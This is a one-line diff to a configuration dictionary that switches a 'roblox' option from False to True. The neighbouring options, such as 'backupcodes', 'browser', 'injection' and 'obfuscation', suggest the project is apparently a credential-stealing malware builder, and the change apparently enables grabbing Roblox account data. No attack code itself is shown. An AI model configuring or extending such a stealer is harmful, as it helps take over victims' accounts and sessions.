@@ -31,7 +31,7 @@ __CONFIG__ = {
     "systeminfo": False,
     "backupcodes": False,
     "browser": False,
-    "roblox": False,
+    "roblox": True,
     "obfuscation": False,
     "injection": False,
     "minecraft": False,
